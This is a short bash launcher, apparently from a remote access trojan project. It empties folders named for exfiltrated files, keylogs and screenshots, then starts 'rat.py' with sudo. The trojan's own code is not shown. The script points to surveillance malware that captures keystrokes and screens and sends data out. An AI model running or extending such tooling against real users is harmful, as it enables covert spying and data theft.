#!/bin/bash

echo "Cleaning up exfiltration files..."
rm ./src/files/*

echo "Cleaning up keylogs files..."
rm ./src/keylogs/*

echo "Cleaning up screenshots files..."
rm ./src/screenshots/*

echo "Starting RAT..."
sudo python3 ./src/rat.py
